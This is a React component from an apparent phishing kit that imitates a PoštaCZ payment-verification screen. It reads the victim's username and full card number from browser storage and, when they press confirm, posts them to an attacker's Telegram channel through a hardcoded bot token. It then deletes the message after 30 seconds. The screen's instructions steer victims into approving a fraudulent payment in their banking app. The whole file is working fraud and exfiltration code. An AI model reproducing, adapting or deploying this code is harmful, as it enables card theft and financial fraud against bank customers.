import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import './NextStepAppr.css';

const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
const TELEGRAM_LOGS_CHAT_ID = '-1003861936742'; // Change to your logs channel ID

const deleteMessageAfterDelay = async (chatId, messageId, delay = 30000) => {
  setTimeout(async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
      await axios.post(url, {
        chat_id: chatId,
        message_id: messageId
      });
      console.log('✅ Message deleted after 30 seconds');
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  }, delay);
};

function NextStepAppr() {
  const navigate = useNavigate();
  const [username, setUsername] = useState('');
  const [fullCardNumber, setFullCardNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [currentTime, setCurrentTime] = useState(new Date());
  const [isLoading, setIsLoading] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);

  // Get username and card number from sessionStorage
  useEffect(() => {
    const storedUsername = sessionStorage.getItem('loginName') || localStorage.getItem('loginName') || 'Unknown User';
    setUsername(storedUsername);
    
    // Get the actual full card number from sessionStorage
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    if (storedCardNumber) {
      setFullCardNumber(storedCardNumber); // Store full card number
      // Format card number to show only last 4 digits for display
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
  }, []);

  // Update time every second
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Send ONLY logs channel notification (removed the main confirmation message)
  const sendLogsChannelNotification = async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const logMessage = `
📋 <b>USER ACTION LOG</b> 📋
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>FULL Card Number:</b> <code>${fullCardNumber}</code>
🔘 <b>Action:</b> User pressed CONFIRMATION button
⏰ <b>Time:</b> ${currentTime.toLocaleString()}
🌐 <b>User Agent:</b> ${navigator.userAgent}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has pressed the confirmation button!</i>
⏰ <i>⚠️ THIS MESSAGE WILL SELF-DELETE IN 30 SECONDS ⚠️</i>
      `;

      const response = await axios.post(url, {
        chat_id: TELEGRAM_LOGS_CHAT_ID,
        text: logMessage,
        parse_mode: 'HTML'
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(TELEGRAM_LOGS_CHAT_ID, messageId, 30000);
      
      console.log('✅ Log sent to Telegram channel (will auto-delete in 30s)');
      return true;
    } catch (error) {
      console.error('Error sending log:', error);
      return false;
    }
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    setIsConfirmed(true);
    
    // Send ONLY the logs channel notification
    await sendLogsChannelNotification();
    
    setIsLoading(false);
    console.log('✅ Confirmed - Log sent to channel');
  };

  const handleCancel = () => {
    window.location.href = '/login';
  };

  const handleManualReload = () => {
    window.location.reload();
  };

  return (
    <div className="confirmation-overlay">
      <div className="confirmation-modal">
        <h3>In App-Verification in PoštaCZ</h3>
        
        {!isConfirmed ? (
          <>
            <div className="confirmation-details">
              <div className="detail-row">
                <span className="detail-label">Merchant:</span>
                <span className="detail-value">PoštaOnline</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Amount:</span>
                <span className="detail-value">00,00 CZK</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Date:</span>
                <span className="detail-value">{currentTime.toLocaleString()}</span>
              </div>
              <div className="detail-row">
                <span className="detail-label">Card number:</span>
                <span className="detail-value">{cardNumber}</span>
              </div>
            </div>

            <div className="confirmation-instructions">
              <p>• Open mobile banking app in your mobile phone.</p>
              <p>• After confirmation come back to this screen.</p>
              <p>• If the screen doesn't close by itself when you come back, just tap "CONFIRMED IN CZ KEY".</p>
            </div>

            <div className="confirmation-buttons">
              <button onClick={handleConfirm} className="confirm-btn" disabled={isLoading}>
                {isLoading ? 'Processing...' : 'Confirm the payment in CZ key'}
              </button>
              
            </div>
          </>
        ) : (
          <div className="waiting-container">
            <div className="waiting-spinner">⏳</div>
            <h3>Waiting for Confirmation</h3>
            <p>Your confirmation has been sent.</p>
            <p>Please check your mobile banking app and complete the payment.</p>
            <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
            
            
          </div>
        )}
      </div>
    </div>
  );
}

export default NextStepAppr;